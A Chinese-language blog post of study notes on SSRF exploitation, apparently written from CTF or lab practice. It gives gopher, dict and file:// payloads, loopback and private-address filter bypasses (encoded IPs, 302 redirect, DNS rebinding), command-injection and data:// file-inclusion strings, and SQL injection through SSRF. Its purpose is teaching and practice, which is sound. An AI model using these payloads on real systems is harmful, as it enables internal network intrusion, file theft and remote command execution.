---
title: ssrf
date: 2025-03-16 21:44:06
tags:
- ssrf
category:
- 学习笔记
---

# SSRF

[SSRF全解](https://cloud.tencent.com/developer/article/2288231)

## SSRF漏洞原理

### ssrf是什么

![](../image/ssrf-1.png)

### ssrf形成的原因以及攻击方式

![](../image/ssrf-2.png)

![](../image/ssrf-3.png)

### ssrf漏洞利用

![](../image/ssrf-4.png)

---

# 伪协议

```
file://	从文件系统中获取文件内容，如file://etc/passwd
dict://	字典服务协议，访问字典资源，如dict:///ip:6739/info:
ftp://	可用于网络端口扫描
sftp://	SSH文件传输协议或安全文件传输协议
ldap://	轻量级目录访问协议
tftp://	简单文件传输协议
gopher://	分布式文档传递服务
```

## File伪协议（查找内网存活主机IP）

**file:// 从文件系统中获取文件内容，格式为 file://[文件路径]**

```
file:///etc/passwd	读取文件passwd

file:///etc/hosts	显示当前操作系统网卡的IP

file:///proc/net/arp	显示arp缓存表（寻找内网其他主机）

file:///proc/net/fib_trie	显示当前网段路由信息
```

**file://proc/net/arp配合bp的intruder模块寻找内网其他主机**

![](../image/ssrf-5.png)

---

## dict伪协议（ 查找内网主机开放端口）

也可以使用ftp://但是效率较低

dict://字典服务协议，访问字典资源，如dict://ip:6739/info:

可用于：扫描端口、获取内网信息、爆破密码等

**ftp伪协议配合bp的intruder模块查找内网主机开放端口**

![](../image/ssrf-6.png)

**dict伪协议配合bp集束炸弹攻击查找内网主机开放端口**

![](../image/ssrf-7.png)

**dict伪协议获取网站信息**

![](../image/ssrf-8.png)

---



## HTTP伪协议（目录扫描）

**http伪协议**

![](../image/ssrf-9.png)

**http伪协议配合bp目录扫描获取网站子页面**

![](../image/ssrf-10.png)

---

## gopher伪协议（重点）

**gopher伪协议**

利用范围较广：GET提交、POST提交、redis、Fastcgi、sql

**基本格式：**

```
URL:gopher://<host>:<port>/<gopher-path>
```

web也需要加端口号80

gopher协议默认端口为70

---

**gopher请求不转发第一个字符：**

所以需要使用下划线填充首位

![](../image/ssrf-11.png)

### gopher伪协议GET提交以及POST提交

**GET提交：直接提交就能执行**

![](../image/ssrf-12.png)

**POST提交：要使用gopher伪协议**

![](../image/ssrf-13.png)

#### gopher伪协议GET提交

**需要保留两个头部信息，而且在GET提交头部信息之后必须要加一个换行符**

浏览器提交

![](../image/ssrf-14.png)

bp请求包提交

![](../image/ssrf-15.png)

```
gopher://172.250.250.4:80/_GET%20/name.php%3fname=benben%20HTTP/1.1%0d%0AHOST:%20172.250.250.4%0d%0A
```

**注意：**

**如果要成功提交，需要进行两次url编码，因为ssrf主机会帮我们解码一次，然后再目标内网主机又会解码一次。所以如果要在bp添加gopher伪协议，需要进行两次url编码**

**如果在浏览器上的话只需要一次，因为浏览器会帮我们编码一次，我们自己编码一次。**

#### gopher伪协议POST提交

**需要保留四个头部信息，且长度需要与实际长度对应**

![](../image/ssrf-16.png)

**在bp重放器里先进行两次url编码，然后再放到gopher伪协议后面然后提交**

![](../image/ssrf-17.png)

![](../image/ssrf-18.png)

**使用插件HackBar进行POST提交**

![](../image/ssrf-19.png)

建议先写好gopher伪协议的固定格式然后抓包，再进行构造头部信息以及编码

```
gopher://172.250.250.4:80/_
```

---

## SSRF之环回地址绕过

比赛中经常限制访问本地网站的某些内容

```
$_SEVER['REMOTE_ADD']=='127.0.0.1'
```

看到REMOTE_ADD地址是127.0.0.1时才会显示

而'127.0.0.1'会被限制

可将'127.0.0.1'变形显示

---

**ip地址**

![](../image/ssrf-20.png)

### 将127.0.0.1替换为其他进制的表达方式来绕过过滤

```
# 127.0.0.0/8 整个网段都是回环地址
127.0.0.1   # localhost
127.0.0.2   # 也是 localhost
127.255.255.254  # 也是 localhost

http://127.0.0.1/flag.php
八进制	
http://017700000001/flag.php	点分式	http://0177.0000.0000.0001/flag.php

十六进制
http://0x7F000001/flag.php		http://0x7F.0x00.0x00.0x01/flag.php		http://0x7F.0.0.1/flag.php

十进制
http://2130706433/flag.php
```

---

## SSRF之302重定向绕过

302重定向主要是绕过针对私网地址被限制的情况

### 302重定向原理：

![](../image/ssrf-21.png)

具体实现：

![](../image/ssrf-22.png)

我们需要有一台有公网IP的服务器，然后进行域名解析的WEB服务，然后构建302重定向代码，

具体步骤

```
在有公网的服务器linux系统下
#index.php

<?php
header('Location:http://127.0.0.1/flag.php');

开启web服务
php -S 0.0.0.0:7777


ssrf服务器访问
http://公网ip:7777/index.php

成功执行302重定向
```

## SSRF之添加@绕过

平常我们传入的url是`url=http://127.0.0.1`，如果 我们传入的url是`url=http://quan9i@127.0.0.1`,它此时依旧会访问127.0.0.1

```
例如：
http://jasmineaura.github.io@127.0.0.1

http://admin:admin@127.0.0.1:3000/
```

---

## SSRF之DNS重绑定绕过

**针对SSRF漏洞的防御**

```
1. 解析目标URL，获取其Host
2. 解析Host，获取Host指向的IP地址
3. 检查IP地址是否为内网地址
4. 请求URL
5. 如果有跳转，拿出跳转URL，执行1
```

可以有效限制：直接访问内网IP；302跳转；xip.io/xip.name 及短链接变换等URL变形；

畸形URL；iframe攻击；IP进制变换

**针对这种防御可以使用DNS Rebinding Attack（DNS重绑定攻击）**

---

### **DNS重绑定攻击原理**

[DNS重绑定网站TTL值为0](https://lock.cmpxchg8b.com/rebinder.html)

这个也可以https://eyes.sh/rebind/

设置A为公网IP，B为私网IP

![](../image/ssrf-23.png)

![](../image/ssrf-24.png)

![](../image/ssrf-25.png)

```
设置一个合法IP为A	设置127.0.0.1公网IP为B
生成DNS解析
df657038.7f000001.rbndr.us

访问
http://df657038.7f000001.rbndr.us/flag.php
```

## 使用SSRF GET提交命令执行

例如：

使用shell.php页面GET方法传值进行命令执行

![](../image/ssrf-26.png)

---

使用gopher伪协议进行命令执行

![](../image/ssrf-27.png)

构造gopher伪协议命令

```
首先在输入框中输入
gopher://172.250.250.4:80/_

然后抓包构造header poc
GET /shell.php?cmd=id HTTP/1.1
Host: 172.250.250.4

注意还有个换行符
然后进行两次url编码接在gopher伪协议之后
```

![](../image/ssrf-28.png)

## 使用SSRF POST提交命令执行

前期依旧是使用file伪协议和dict伪协议、http伪协议查找内网存活主机IP和内网主机开放端口并且扫描目录，查找可利用的页面

使用gopher伪协议进行POST提交

![](../image/ssrf-29.png)

![](../image/ssrf-30.png)

POST提交命令执行拿到flag，还是注意构造好header poc，长度要对应

```
id=127.0.0.1;cat+flag
```

![](../image/ssrf-31.png)

---

## 使用SSRF进行XXE漏洞利用

XXE漏洞实例：

![](../image/ssrf-32.png)

![](../image/ssrf-33.png)

构造payload：

![](../image/ssrf-34.png)

然后使用gopher伪协议进行提交
![](../image/ssrf-35.png)

---

## 使用SSRF进行sql注入漏洞

1、使用http伪协议获取信息

2、sql注入

实例：

路径

```
http://172.250.250.11/Less-1/?id=1
```

sql注入代码

![](../image/ssrf-36.png)

浏览器直接提交

```
http://172.250.250.11/Less-1/?id=1'--%20

注意：
这里--之后应该用%20而不是+，空格必须先url编码一次变成%20
如果在hackbar中则需要进行两次url编码
```

### **sql注入GET提交**

![](../image/ssrf-37.png)

---

### **sql注入POST提交**

![](../image/ssrf-38.png)

![](../image/ssrf-39.png)

构造payload并使用gopher伪协议提交
![](../image/ssrf-40.png)

替换查找内容，以及字符串长度

---

## 使用SSRF进行文件上传漏洞

### **multipart/form-data的定义**

![](../image/ssrf-41.png)

文件上传漏洞实例：

```
http://172.250.250.14/Pass-01/index.php
```

先查看源码：

![](../image/ssrf-42.png)

请求头，需要指定边界

![](../image/ssrf-43.png)

### 构造gohper提交数据

![](../image/ssrf-44.png)

这里分隔符可以自定义。并且最后还需要结束符号

```
分隔符格式
--分隔符

结束分隔符
--自定义分隔符--
```

### 使用gopher伪协议提交

![](../image/ssrf-45.png)

---

## 使用SSRF进行文件包含漏洞利用

例如

```
http://172.250.250.14/include.php?file=data://text/plain,<?php%20system('ls');?>
执行data://伪协议	命令执行	空格用%20代替

http://172.250.250.14/include.php?file=file:///etc/passwd
执行file://伪协议	读取文件

http://172.250.250.14/include.php?file=data://text/plain,<?php%20phpinfo();?>
执行data://伪协议	代码执行	空格用%20代替
```

gopher伪协议ssrf和之前的几个漏洞差不多

---

















